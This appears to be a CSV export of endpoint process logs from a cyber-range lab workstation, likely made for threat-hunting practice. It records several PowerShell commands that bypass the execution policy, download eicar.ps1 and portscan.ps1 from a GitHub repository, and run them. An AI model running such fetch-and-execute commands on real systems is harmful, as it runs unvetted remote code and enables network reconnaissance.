Timestamp,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,DeviceName
"Apr 1, 2025 8:25:05 PM",powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1,cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1",sjr-workstation
"Apr 1, 2025 8:25:05 PM",powershell.exe,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,cmd.exe,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""",sjr-workstation
"Apr 1, 2025 8:25:09 PM",cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1",powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script1.ps1,sjr-workstation
"Apr 1, 2025 8:25:09 PM",powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1,cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1",sjr-workstation
"Apr 1, 2025 8:26:57 PM",powershell.exe,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\8e0b85ee-da90-46d9-b939-75081a1ceb3a.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\8e0b85ee-da90-46d9-b939-75081a1ceb3a.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '9bd2203d864ae5c53497f9be78a347a16e20306496275d2b906024552ed7fcf7')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\8e0b85ee-da90-46d9-b939-75081a1ceb3a.ps1' }""",senseir.exe,"""SenseIR.exe"" ""OfflineSenseIR"" ""3388"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MzIwOH0=""",sjr-workstation
"Apr 1, 2025 8:37:23 PM",powershell.exe,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,cmd.exe,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""",sjr-workstation
"Apr 1, 2025 8:37:25 PM",cmd.exe,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script2.ps1",runcommandextension.exe,"RunCommandExtension.exe  ""enable""",sjr-workstation
"Apr 1, 2025 8:37:25 PM",powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script2.ps1,cmd.exe,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script2.ps1",sjr-workstation
"Apr 1, 2025 8:37:25 PM",cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1",powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script2.ps1,sjr-workstation
"Apr 1, 2025 8:37:25 PM",powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1",sjr-workstation
"Apr 1, 2025 8:37:29 PM",cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1",powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script2.ps1,sjr-workstation
"Apr 1, 2025 8:37:29 PM",powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1,cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1",sjr-workstation
